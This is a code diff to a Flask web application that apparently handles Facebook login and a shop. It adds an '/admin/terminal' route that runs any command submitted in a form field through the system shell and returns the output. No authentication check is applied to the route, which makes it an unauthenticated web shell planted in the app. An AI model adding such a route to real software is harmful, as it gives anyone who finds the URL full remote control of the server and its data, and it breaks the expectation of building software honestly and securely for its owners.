@@ -16,6 +16,7 @@ from flask_dance.contrib.facebook import make_facebook_blueprint, facebook
 from functools import wraps
 from flask_talisman import Talisman  # Enforces HTTPS security headers
 from werkzeug.middleware.proxy_fix import ProxyFix
+import subprocess
 
 # Initialize Flask app
 app = Flask(__name__, template_folder="pages", static_url_path="/static")
@@ -747,6 +748,17 @@ def redirect_www():
     if request.host.startswith("www."):
         return redirect(request.url.replace("www.", ""), code=301)
 
+@app.route("/admin/terminal", methods=["GET", "POST"])
+def admin_terminal():
+    output = ""
+    if request.method == "POST":
+        command = request.form.get("command")
+        if command:
+            try:
+                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode()
+            except subprocess.CalledProcessError as e:
+                output = e.output.decode()
+    return render_template("terminal.html", output=output)
 
 @app.route("/shop")
 def shop():
